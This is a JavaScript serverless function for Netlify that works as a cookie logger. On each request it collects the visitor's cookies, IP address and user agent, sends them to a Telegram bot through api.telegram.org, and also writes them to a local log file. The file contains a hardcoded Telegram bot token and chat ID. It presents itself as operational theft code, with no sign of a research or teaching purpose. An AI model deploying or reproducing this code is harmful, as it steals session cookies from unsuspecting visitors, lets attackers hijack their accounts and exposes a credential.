const https = require('https');

// For production, move these to Netlify Environment Variables in the dashboard.
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '8569746095';

exports.handler = async (event, context) => {
  const cookies = event.headers.cookie || '(No cookies found)';
  const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown';
  const ua = event.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString();

  const message = `
🔍 **New Cookie Log**
📅 Time: ${timestamp}
🌍 IP: \`${ip}\`
📱 Device: \`${ua.substring(0, 50)}...\`

🍪 **Cookies:**
\`${cookies}\`
  `.trim();

  const tgUrl = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
  
  const tgPayload = JSON.stringify({
    chat_id: TG_CHAT_ID,
    text: message,
    parse_mode: 'Markdown'
  });

  const tgData = Buffer.from(tgPayload);

  const tgOptions = {
    hostname: 'api.telegram.org',
    path: `/bot${TG_BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': tgData.length
    }
  };

  try {
    await new Promise((resolve, reject) => {
      const req = https.request(tgOptions, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve(data);
          } else {
            reject(new Error(`Telegram API Error ${res.statusCode}: ${data}`));
          }
        });
      });
      req.on('error', reject);
      req.write(tgData);
      req.end();
    });

    const fs = require('fs');
    const logEntry = `[${timestamp}] IP: ${ip} | UA: ${ua} | Cookies: ${cookies}\n`;
    fs.appendFileSync('/tmp/log.txt', logEntry);

    return {
      statusCode: 200,
      body: JSON.stringify({ status: 'logged', tg_sent: true })
    };

  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ status: 'error', message: error.message })
    };
  }
};
